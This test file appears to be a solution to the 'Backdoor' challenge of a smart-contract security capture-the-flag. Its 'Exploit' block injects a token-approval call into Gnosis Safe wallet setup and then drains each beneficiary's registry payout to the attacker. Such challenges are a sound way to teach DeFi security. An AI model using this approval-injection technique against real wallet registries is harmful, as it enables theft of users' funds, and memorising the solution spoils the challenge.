const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Backdoor", function () {
    let deployer, users, attacker

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners()
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory("GnosisSafe", deployer)).deploy()
        this.walletFactory = await (
            await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
        ).deploy()
        this.token = await (
            await ethers.getContractFactory("DamnValuableToken", deployer)
        ).deploy()

        // Deploy the registry
        this.walletRegistry = await (
            await ethers.getContractFactory("WalletRegistry", deployer)
        ).deploy(this.masterCopy.address, this.walletFactory.address, this.token.address, users)

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.true
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000"
        // 1) Deploy our solver contract
        const solver = await (
            await ethers.getContractFactory("BackdoorSolver", deployer)
        ).deploy(this.token.address)
        // 2) Create payload for approving token transfer of DVT
        const tokenApprovalData = solver.interface.encodeFunctionData("approveDVT", [
            attacker.address,
            AMOUNT_TOKENS_DISTRIBUTED,
        ])
        // 3) Make sure we include the above payload when creating Proxy for the Safe
        for (let i = 0; i < users.length; i++) {
            const setupParms = [
                [users[i]],
                1, // Threshold
                solver.address, // To Address
                tokenApprovalData, // Calldata
                ZERO_ADDRESS, // Handler for fallback calls
                ZERO_ADDRESS, // Payment token, set to 0 for ETH
                0, // Payment value
                ZERO_ADDRESS, // Address that should receive the payment
            ]
            // Setup payload
            const setupData = this.masterCopy.interface.encodeFunctionData("setup", setupParms)
            const factoryConnect = this.walletFactory.connect(attacker)
            const saltNonce = Date.now()
            const txCreateProxy = await factoryConnect.createProxyWithCallback(
                this.masterCopy.address,
                setupData,
                saltNonce,
                this.walletRegistry.address
            )
            const txCreateProxyReceipt = await txCreateProxy.wait(1)
            // console.log(txCreateProxyReceipt.events[2].args)
            const safeProxyAddress = txCreateProxyReceipt.events[2].args.proxy
            // const safeProxy = ethers.getContractAt("GnosisSafe",safeProxyAddress, attacker)

            //
            const safeTokenBalance = await this.token.balanceOf(safeProxyAddress)
            console.log(`New Wallet Balance = ${ethers.utils.formatEther(safeTokenBalance)} DVT`)

            const tokenConnect = this.token.connect(attacker)
            await tokenConnect.transferFrom(safeProxyAddress, attacker.address, safeTokenBalance)
            const attackerTokenBalance = await this.token.balanceOf(attacker.address)
            console.log(`Attacker Balance = ${ethers.utils.formatEther(attackerTokenBalance)} DVT`)
        }
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i])
            // User must have registered a wallet
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                "User did not register a wallet"
            )
            // User is no longer registered as a beneficiary
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false
        }
        // Attacker must have taken all tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(AMOUNT_TOKENS_DISTRIBUTED)
    })
})
